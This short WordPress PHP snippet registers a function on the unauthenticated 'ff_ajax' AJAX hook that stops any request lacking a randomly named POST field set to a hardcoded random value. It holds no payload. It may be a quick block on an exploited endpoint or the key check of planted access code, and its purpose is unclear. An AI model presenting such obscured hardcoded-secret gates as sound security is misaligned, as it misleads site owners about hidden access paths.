<?php

function widget_user_cover() {
	if (!isset($_POST["aishlhxwurib"]) || $_POST["aishlhxwurib"] !== "qIKFvHmcKRnLK") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'widget_user_cover', 5, 1);
